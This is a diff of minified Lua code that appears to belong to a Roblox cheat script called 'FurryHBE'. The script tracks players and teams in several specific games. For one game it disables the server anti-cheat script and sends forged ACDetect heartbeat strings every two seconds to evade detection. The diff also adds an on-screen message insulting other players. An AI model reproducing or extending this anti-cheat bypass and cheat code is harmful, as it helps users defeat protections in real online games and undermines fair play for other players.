 if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
-local P=I:FindFirstChild"Head"
-P:GetPropertyChangedSignal"Material":Connect(function()
-H:Update()
+local Q=J:FindFirstChild"Head"
+Q:GetPropertyChangedSignal"Material":Connect(function()
+I:Update()
 end)
 end
 end
 end)
-G.CharacterRemoving:Connect(function()
+H.CharacterRemoving:Connect(function()
 
-if H then
-J={}
+if I then
+K={}
 end
 end)
-G:GetPropertyChangedSignal"Team":Connect(function(N)
+H:GetPropertyChangedSignal"Team":Connect(function(O)
 
-H:Update()
+I:Update()
 end)
 if game.PlaceId==6172932937 then
-local N=G:WaitForChild"ragdolled"
-N.Changed:Connect(function()
-H:Update()
+local O=H:WaitForChild"ragdolled"
+O.Changed:Connect(function()
+I:Update()
 end)
 end
 if game.GameId==1934496708 then
-local N=m:WaitForChild"FriendlyFire"
-N.Changed:Connect(function()
-H:Update()
+local O=n:WaitForChild"FriendlyFire"
+O.Changed:Connect(function()
+I:Update()
 end)
 end
 if game.GameId==2162282815 then
-local N=m:WaitForChild"MapFolder"
-local O=N:WaitForChild"Players"
-for P,Q in pairs(O:GetChildren())do
-if Q.Name==G.Name then
-I=Q
+local O=n:WaitForChild"MapFolder"
+local P=O:WaitForChild"Players"
+for Q,R in pairs(P:GetChildren())do
+if R.Name==H.Name then
+J=R
 end
 end
-O.ChildAdded:Connect(function(P)
-if P.Name==G.Name then
-I=P
+P.ChildAdded:Connect(function(Q)
+if Q.Name==H.Name then
+J=Q
 end
 end)
 end
 if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
-if I then
-local N=I:FindFirstChild"Head"
-N:GetPropertyChangedSignal"Material":Connect(function()
-H:Update()
+if J then
+local O=J:FindFirstChild"Head"
+O:GetPropertyChangedSignal"Material":Connect(function()
+I:Update()
 end)
 end
 end
 end
 
-local function removePlayer(G)
-if not r[G]then return end
-r[G]:DeleteVisuals()
-table.remove(Options.ignorePlayerList.Values,table.find(Options.ignorePlayerList.Values,G.Name))
+local function removePlayer(H)
+if not s[H]then return end
+s[H]:DeleteVisuals()
+table.remove(Options.ignorePlayerList.Values,table.find(Options.ignorePlayerList.Values,H.Name))
 updateList(Options.ignorePlayerList)
-r[G]=nil
+s[H]=nil
 end
 
-for G,H in ipairs(k:GetPlayers())do
-if H==q then
+for H,I in ipairs(l:GetPlayers())do
+if I==r then
 continue
 end
 
-addPlayer(H)
+addPlayer(I)
 end
-for G,H in pairs(j:GetTeams())do
+for H,I in pairs(k:GetTeams())do
+if I:IsA"Team"then
+
+table.insert(Options.ignoreTeamList.Values,I.Name)
+updateList(Options.ignoreTeamList)
+end
+end
+l.PlayerAdded:Connect(function(H)
+
+addPlayer(H)
+end)
+l.PlayerRemoving:Connect(function(H)
+
+removePlayer(H)
+end)
+k.ChildAdded:Connect(function(H)
 if H:IsA"Team"then
 
 table.insert(Options.ignoreTeamList.Values,H.Name)
 updateList(Options.ignoreTeamList)
 end
-end
-k.PlayerAdded:Connect(function(G)
-
-addPlayer(G)
 end)
-k.PlayerRemoving:Connect(function(G)
+k.ChildRemoved:Connect(function(H)
+if H:IsA"Team"then
 
-removePlayer(G)
-end)
-j.ChildAdded:Connect(function(G)
-if G:IsA"Team"then
-
-table.insert(Options.ignoreTeamList.Values,G.Name)
-updateList(Options.ignoreTeamList)
-end
-end)
-j.ChildRemoved:Connect(function(G)
-if G:IsA"Team"then
-
-table.remove(Options.ignoreTeamList.Values,table.find(Options.ignoreTeamList.Values,G.Name))
+table.remove(Options.ignoreTeamList.Values,table.find(Options.ignoreTeamList.Values,H.Name))
 updateList(Options.ignoreTeamList)
 end
 end)
 
-q:GetAttributeChangedSignal"Team":Connect(function()
+r:GetAttributeChangedSignal"Team":Connect(function()
 updatePlayers()
 end)
-q.CharacterAdded:Connect(function()
+r.CharacterAdded:Connect(function()
 updatePlayers()
 end)
 
@@ -747,19 +749,25 @@ end)
 
 if game.PlaceId==111311599 then
 
-local G=game:GetService"ReplicatedFirst"["Serverbased AntiCheat"]
-local H=q:WaitForChild"SValue"
+local H=game:GetService"ReplicatedFirst"["Serverbased AntiCheat"]
+local I=r:WaitForChild"SValue"
 local function constructAnticheatString()
-return"CS-"..math.random(11111,99999).."-"..math.random(1111,9999).."-"..math.random(111111,999999)..math.random(1111111,9999999)..(H.Value*6)^2+18
+return"CS-"..math.random(11111,99999).."-"..math.random(1111,9999).."-"..math.random(111111,999999)..math.random(1111111,9999999)..(I.Value*6)^2+18
 end
 task.spawn(function()
 while true do
 task.wait(2)
-game:GetService"ReplicatedStorage".ACDetect:FireServer(H.Value,constructAnticheatString())
+game:GetService"ReplicatedStorage".ACDetect:FireServer(I.Value,constructAnticheatString())
 end
 end)
-G.Disabled=true
+H.Disabled=true
 end
 
 getgenv().FurryHBELoaded=true
 updatePlayers()
+
+j:SetCore("SendNotification",{
+Title="wizhorror",
+Text="get fucked shitter",
+Duration=2
+})
